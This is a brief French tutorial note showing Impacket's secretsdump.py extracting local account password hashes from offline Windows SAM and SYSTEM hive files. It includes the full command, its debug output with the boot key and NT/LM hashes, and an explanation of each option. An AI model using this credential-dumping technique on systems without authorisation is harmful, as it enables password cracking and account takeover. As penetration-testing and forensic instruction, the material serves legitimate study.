# Sam Windows

    $ secretsdump.py -debug -sam sam_windows -system system_windows LOCAL
    Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

    [+] Retrieving class info for JD
    [+] Unknown type 0xe
    [+] Retrieving class info for Skew1
    [+] Unknown type 0xb
    [+] Retrieving class info for GBG
    [+] Unknown type 0x8
    [+] Retrieving class info for Data
    [+] Unknown type 0x6
    [*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    [+] Calculating HashedBootKey from SAM
    [+] NewStyle hashes is: False
    Administrator:500:NONE:NONE:::
    [+] NewStyle hashes is: False
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    [+] NewStyle hashes is: False
    Seyptoo:1000:aad3b435b51404eeaad3b435b51404ee:ee7e0b247f06ef203cf92ad55eeb2d13:::
    [*] Cleaning up... 

L'option -debug permet d'afficher des informations détaillés, l'option -sam permet de spécifier le fichier SAM, l'option -system permet de mettre le fichier système pour ensuite dump les informations d'identification et enfin l'option LOCAL permet d'analyser le fichier c'est obligatoire.
